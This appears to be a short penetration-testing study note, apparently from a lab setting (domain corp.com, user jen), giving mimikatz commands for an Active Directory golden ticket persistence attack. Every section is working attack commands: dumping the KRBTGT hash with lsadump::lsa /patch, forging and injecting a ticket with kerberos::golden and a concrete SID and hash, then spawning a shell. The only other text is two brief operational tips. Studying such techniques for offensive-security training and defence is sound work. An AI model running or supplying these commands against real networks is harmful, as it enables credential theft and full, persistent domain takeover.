#activedirectory #persiatance 

#### Extract the KRBTGT Hash

```mimikatz
privilege::debug
```

```mimikatz
lsadump::lsa /patch
```

🔴 After obtaining the hash creating and injecting the golden ticket to memory does not require admin privileges

#### Create a ticket

```mimikatz
kerberos::purge
```

```mimikatz
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

```mimikatz
misc::cmd
```

🔴You wont be able to use IP to connect because it forces NTLM authentication